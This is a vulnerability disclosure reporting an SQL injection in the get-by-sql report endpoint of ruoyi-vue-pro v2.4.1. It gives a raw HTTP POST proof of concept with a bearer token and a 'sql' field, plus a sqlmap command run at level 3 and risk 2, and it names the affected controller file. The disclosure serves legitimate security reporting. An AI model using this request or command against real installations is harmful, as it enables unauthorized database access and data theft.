BUG_Author

Longlong Gong

# Project

Address: [ruoyi-vue-pro](https://gitee.com/zhijiantianya/ruoyi-vue-pro)

## SQL injection

###  `/report/go-view/data/get-by-sql` SQL injection

[Affected version]

v2.4.1



[Affected Component]

/report/go-view/data/get-by-sql



[Software]

https://gitee.com/zhijiantianya/ruoyi-vue-pro/archive/refs/tags/v2.4.1(jdk8/11).zip



[Description]

There is an SQL injection vulnerability in the SQL parameters of the `/report/go view/data/get by SQL ` interface in the ruoyi vue pro system v2.4.1. Hackers can exploit this vulnerability to obtain sensitive server information

POC

```
POST /admin-api/report/go-view/data/get-by-sql HTTP/1.1
Host: 127.0.0.1:48080
Content-Length: 18
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
sec-ch-ua-mobile: ?0
Authorization: Bearer 086046e45f974777a8c524c4980d3f91
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json
Accept: application/json, text/plain, */*
tenant-id: 1
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1:3000
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:3000/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"sql":"*"}
```

```
use sqlmap：python sqlmap.py -r poc.txt --level 3 --risk 2
```

ruoyi-vue-pro-v2.4.1(jdk8-11)\yudao-module-report\yudao-module-report-biz\src\main\java\cn\iocoder\yudao\module\report\controller\admin\goview\GoViewDataController.java

![image-20250302125945435](assets/image-20250302125945435.png)

![image-20250302130006760](assets/image-20250302130006760.png)

Report Management ->Large Screen Designer ->Projects ->My All Projects. After importing the initial SQL file, here is an SQL example. Click Preview, capture the POC written above, and directly use level 3 and risk 2 to successfully attack the sqlmap

![image-20250302125648561](assets/image-20250302125648561.png)

![image-20250302125703090](assets/image-20250302125703090.png)

![image-20250302130437650](assets/image-20250302130437650.png)

![image-20250302125733536](assets/image-20250302125733536.png)

![image-20250302125747000](assets/image-20250302125747000.png)
